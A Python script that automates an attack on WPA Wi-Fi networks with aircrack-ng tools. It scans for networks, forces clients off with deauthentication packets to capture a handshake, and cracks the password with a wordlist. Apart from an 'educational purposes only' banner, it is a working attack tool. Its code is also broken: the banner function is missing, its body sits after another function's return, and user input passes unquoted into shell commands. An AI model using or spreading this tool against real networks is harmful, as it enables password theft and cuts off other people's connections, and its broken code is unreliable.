#!/usr/bin/env python3

# WiFi Security Testing Script (Python version)
# For educational purposes only - Use only on networks you own or have permission to test
# Enhanced version with Node.js integration support

import os
import sys
import time
import subprocess
import re
import signal
import shutil
import tempfile
import csv
import json
import argparse
from colorama import Fore, Style, init

# Initialize colorama for cross-platform colored terminal output
init()

# Global variables
temp_dir = None
monitor_interface = None

def print_status(status_type, message, data=None):
    """Print status message that can be parsed by Node.js integration"""
    if data is None:
        data = {}
    
    status = {
        "type": status_type,
        "message": message,
        "timestamp": time.time(),
        "data": data
    }
    
    # Print JSON status for programmatic parsing
    print(f"STATUS_JSON:{json.dumps(status)}")
    
    # Also print human-readable format
    colors = {
        "info": Fore.BLUE,
        "success": Fore.GREEN,
        "warning": Fore.YELLOW,
        "error": Fore.RED
    }
    color = colors.get(status_type, Fore.WHITE)
    print(f"{color}[{status_type.upper()}] {message}{Style.RESET_ALL}")

def check_integration_mode():
    """Check if script is being called from Node.js integration"""
    parser = argparse.ArgumentParser(description='WiFi Security Testing Tool')
    parser.add_argument('--integration', action='store_true', 
                        help='Run in integration mode for Node.js bridge')
    parser.add_argument('--auto-mode', action='store_true',
                        help='Run with minimal user interaction')
    parser.add_argument('--target-ssid', type=str,
                        help='Target SSID for testing')
    parser.add_argument('--wordlist', type=str,
                        help='Path to wordlist file')
    
    args = parser.parse_args()
    return args
    """Print the script banner"""
    print(f"{Fore.BLUE}===================================================")
    print(f"           WiFi Security Testing Tool")
    print(f"===================================================")
    print(f"{Fore.RED}WARNING: Only use on networks you own or have permission to test")
    print(f"{Fore.BLUE}==================================================={Style.RESET_ALL}\n")

def check_root():
    """Check if script is run as root"""
    if os.geteuid() != 0:
        print(f"{Fore.RED}[-] This script must be run as root{Style.RESET_ALL}")
        sys.exit(1)

def check_requirements():
    """Check if required tools are installed"""
    print(f"{Fore.BLUE}[*] Checking for required tools...{Style.RESET_ALL}")
    
    tools = ["aircrack-ng", "airodump-ng", "aireplay-ng", "macchanger"]
    missing = False
    
    for tool in tools:
        if shutil.which(tool) is None:
            print(f"{Fore.RED}[-] {tool} not found. Please install aircrack-ng suite.{Style.RESET_ALL}")
            missing = True
    
    if missing:
        print(f"{Fore.YELLOW}[!] Install missing tools with: sudo apt-get install aircrack-ng{Style.RESET_ALL}")
        sys.exit(1)
    else:
        print(f"{Fore.GREEN}[+] All required tools are installed.{Style.RESET_ALL}")

def run_command(command):
    """Run shell command and return output"""
    try:
        result = subprocess.run(command, shell=True, check=True, text=True, 
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.stdout
    except subprocess.CalledProcessError as e:
        # Don't exit on command failures, just log them
        if sys.platform.startswith('linux'):
            print(f"{Fore.RED}[-] Command failed: {e}{Style.RESET_ALL}")
        # On macOS, many Linux commands will fail - this is expected
        return None
    except Exception as e:
        print(f"{Fore.YELLOW}[!] Command execution error: {e}{Style.RESET_ALL}")
        return None

def enable_monitor_mode():
    """Put wireless interface in monitor mode"""
    global monitor_interface
    
    print(f"{Fore.BLUE}[*] Available wireless interfaces:{Style.RESET_ALL}")
    
    # Get wireless interfaces
    interfaces_output = run_command("iwconfig 2>/dev/null | grep -i 'ieee 802.11'")
    if not interfaces_output:
        print(f"{Fore.RED}[-] No wireless interfaces found.{Style.RESET_ALL}")
        sys.exit(1)
    
    interfaces = []
    for line in interfaces_output.splitlines():
        interface = line.split()[0]
        print(f"  - {interface}")
        interfaces.append(interface)
    
    # Get interface from user
    interface = input(f"{Fore.YELLOW}[?] Enter interface name to use: {Style.RESET_ALL}")
    if interface not in interfaces:
        print(f"{Fore.RED}[-] Invalid interface selected.{Style.RESET_ALL}")
        sys.exit(1)
    
    print(f"{Fore.BLUE}[*] Putting {interface} into monitor mode...{Style.RESET_ALL}")
    run_command("airmon-ng check kill > /dev/null")
    run_command(f"airmon-ng start {interface} > /dev/null")
    
    # Get monitor mode interface name
    monitor_output = run_command("iwconfig 2>/dev/null | grep -i 'mode:monitor'")
    if not monitor_output:
        print(f"{Fore.RED}[-] Failed to enable monitor mode.{Style.RESET_ALL}")
        sys.exit(1)
    
    monitor_interface = monitor_output.split()[0]
    print(f"{Fore.GREEN}[+] Monitor mode enabled on interface: {monitor_interface}{Style.RESET_ALL}")

def scan_networks():
    """Scan for available WiFi networks"""
    global temp_dir
    
    print(f"{Fore.BLUE}[*] Scanning for WiFi networks...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] Press Ctrl+C after a few seconds to stop scanning{Style.RESET_ALL}")
    time.sleep(2)
    
    # Create temp directory for files
    temp_dir = tempfile.mkdtemp()
    scan_file = os.path.join(temp_dir, "scan")
    
    # Start scanning in a new process
    scan_process = subprocess.Popen(
        f"airodump-ng -w {scan_file} --output-format csv {monitor_interface}",
        shell=True, preexec_fn=os.setsid
    )
    
    try:
        # Wait for user to stop
        input(f"{Fore.YELLOW}[!] Press Enter to stop scanning...{Style.RESET_ALL}")
    except KeyboardInterrupt:
        pass
    finally:
        # Kill the airodump-ng process
        os.killpg(os.getpgid(scan_process.pid), signal.SIGTERM)
        time.sleep(1)
    
    # Parse the CSV results
    networks_file = f"{scan_file}-01.csv"
    if not os.path.isfile(networks_file):
        print(f"{Fore.RED}[-] No networks found or scan was interrupted too soon.{Style.RESET_ALL}")
        cleanup_and_exit()
    
    networks = []
    with open(networks_file, 'r', encoding='utf-8') as csvfile:
        reader = csv.reader(csvfile)
        for row in reader:
            # Skip empty rows and client rows
            if not row or len(row) < 14 or row[0].strip() == "BSSID" or row[0].strip() == "Station MAC":
                continue
            # Only process AP rows
            if row[0].strip() and row[13].strip():  # BSSID and ESSID not empty
                networks.append({
                    "bssid": row[0].strip(),
                    "channel": row[3].strip(),
                    "essid": row[13].strip()
                })
    
    # Display networks and let user select one
    if not networks:
        print(f"{Fore.RED}[-] No networks found.{Style.RESET_ALL}")
        cleanup_and_exit()
    
    print(f"{Fore.GREEN}[+] Networks found:{Style.RESET_ALL}")
    for i, network in enumerate(networks, 1):
        print(f"  {i}. BSSID: {network['bssid']}, Channel: {network['channel']}, ESSID: {network['essid']}")
    
    while True:
        try:
            selection = int(input(f"{Fore.YELLOW}[?] Select network number to target: {Style.RESET_ALL}"))
            if 1 <= selection <= len(networks):
                target_network = networks[selection-1]
                print(f"{Fore.GREEN}[+] Selected target: BSSID: {target_network['bssid']}, " 
                      f"Channel: {target_network['channel']}, ESSID: {target_network['essid']}{Style.RESET_ALL}")
                return target_network
            else:
                print(f"{Fore.RED}[-] Invalid selection. Please choose a number between 1 and {len(networks)}.{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}[-] Please enter a valid number.{Style.RESET_ALL}")

def capture_handshake(target_network):
    """Capture WPA handshake for the target network"""
    global temp_dir
    
    bssid = target_network['bssid']
    channel = target_network['channel']
    essid = target_network['essid']
    
    print(f"{Fore.BLUE}[*] Capturing WPA handshake for {essid}...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] Press Ctrl+C once you see 'WPA handshake' message{Style.RESET_ALL}")
    
    # Set channel
    run_command(f"iwconfig {monitor_interface} channel {channel}")
    
    # Start capturing
    capture_file = os.path.join(temp_dir, "capture")
    capture_process = subprocess.Popen(
        f"airodump-ng -c {channel} --bssid {bssid} -w {capture_file} {monitor_interface}",
        shell=True, preexec_fn=os.setsid
    )
    
    # Wait a bit
    time.sleep(5)
    
    # Option to send deauthentication packets
    deauth_choice = input(f"{Fore.YELLOW}[?] Do you want to send deauthentication packets (y/n)? {Style.RESET_ALL}")
    if deauth_choice.lower() == 'y':
        print(f"{Fore.BLUE}[*] Sending deauthentication packets...{Style.RESET_ALL}")
        run_command(f"aireplay-ng --deauth 5 -a {bssid} {monitor_interface}")
    
    # Wait for user to stop capture
    try:
        input(f"{Fore.YELLOW}[!] Press Enter when you've captured the handshake...{Style.RESET_ALL}")
    except KeyboardInterrupt:
        pass
    finally:
        # Kill the airodump-ng process
        os.killpg(os.getpgid(capture_process.pid), signal.SIGTERM)
        time.sleep(1)
    
    # Check for handshake
    capture_cap = f"{capture_file}-01.cap"
    if not os.path.isfile(capture_cap):
        print(f"{Fore.RED}[-] Capture file not found.{Style.RESET_ALL}")
        cleanup_and_exit()
    
    # Verify handshake was captured
    verify_output = run_command(f"aircrack-ng -w /dev/null {capture_cap}")
    if "1 handshake" in verify_output:
        print(f"{Fore.GREEN}[+] WPA handshake successfully captured!{Style.RESET_ALL}")
        return capture_cap
    else:
        print(f"{Fore.RED}[-] No handshake was captured. Try again.{Style.RESET_ALL}")
        cleanup_and_exit()

def dictionary_attack(handshake_file, bssid):
    """Perform dictionary attack on captured handshake"""
    print(f"{Fore.BLUE}[*] Preparing for dictionary attack...{Style.RESET_ALL}")
    
    # Ask for wordlist
    wordlist = input(f"{Fore.YELLOW}[?] Enter path to wordlist file: {Style.RESET_ALL}")
    
    if not os.path.isfile(wordlist):
        print(f"{Fore.RED}[-] Wordlist file not found.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Common wordlist locations:{Style.RESET_ALL}")
        print("    - /usr/share/wordlists/")
        print("    - /usr/share/seclists/Passwords/")
        cleanup_and_exit()
    
    print(f"{Fore.BLUE}[*] Starting dictionary attack using {wordlist}...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] This may take a long time depending on wordlist size{Style.RESET_ALL}")
    
    # Start the cracking process
    crack_output = run_command(f"aircrack-ng -w {wordlist} -b {bssid} {handshake_file}")
    print(crack_output)
    
    print(f"{Fore.BLUE}[*] Attack completed.{Style.RESET_ALL}")

def cleanup_and_exit():
    """Clean up and restore normal wireless operation"""
    global monitor_interface, temp_dir
    
    print(f"{Fore.BLUE}[*] Cleaning up and restoring normal wireless operation...{Style.RESET_ALL}")
    
    # Disable monitor mode (Linux only)
    if monitor_interface and sys.platform.startswith('linux'):
        run_command(f"airmon-ng stop {monitor_interface} > /dev/null")
    
    # Restart network manager (Linux only)
    if sys.platform.startswith('linux'):
        run_command("service NetworkManager restart > /dev/null 2>&1 || service networking restart > /dev/null 2>&1")
    elif sys.platform == 'darwin':  # macOS
        print(f"{Fore.YELLOW}[!] On macOS, network services don't need manual restart{Style.RESET_ALL}")
    
    # Remove temporary files
    if temp_dir and os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
    
    print(f"{Fore.GREEN}[+] Cleanup complete. Exiting...{Style.RESET_ALL}")
    sys.exit(0)

def main():
    """Main function"""
    try:
        print_banner()
        check_root()
        check_requirements()
        enable_monitor_mode()
        target_network = scan_networks()
        handshake_file = capture_handshake(target_network)
        dictionary_attack(handshake_file, target_network['bssid'])
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Script interrupted by user.{Style.RESET_ALL}")
    finally:
        cleanup_and_exit()

# Trap Ctrl+C to ensure proper cleanup
if __name__ == "__main__":
    # Register signal handler
    signal.signal(signal.SIGINT, lambda sig, frame: cleanup_and_exit())
    main()